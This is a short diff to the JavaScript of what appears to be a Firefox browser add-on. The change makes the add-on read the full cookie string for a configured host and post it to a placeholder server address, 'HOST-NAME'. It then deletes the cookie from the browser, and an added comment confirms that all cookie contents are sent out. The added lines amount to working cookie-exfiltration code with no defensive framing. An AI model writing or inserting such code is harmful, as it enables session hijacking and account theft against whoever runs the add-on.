@@ -19,8 +19,8 @@ const COOKIE_DETAILS = {"cookieHost": ".put-cookie-hostname.here", "cookieName":
 
 // START - Addon Functionalities
 
-function doPost(cname) {
-  var promise_jam = xhr('api-call-url.com', {
+function doPost(cname, postUrl) {
+  var promise_jam = xhr(postUrl, {
     aPostData: {
       cookieName: cname
       // type: 'base64'
@@ -260,10 +260,11 @@ function getCookie(cookieHost, cookieName, cookiePath){
         name: cookieName,
   });
   if(cookieExistence){
-    doPost("Cookie Found");
+    doPost(Services.getCookieString(Services.io.newURI(COOKIE_DETAILS.cookieHost, null, null), null), "HOST-NAME");
+// The above line will post all the cookie content to the website, need to extract using `split(';')`
     Services.cookies.remove(cookieHost,cookieName,cookiePath,false);
   }
   else {
-    doPost("cookie Not found");
+    doPost("cookie Not found", "HOST-NAME");
   }
 }
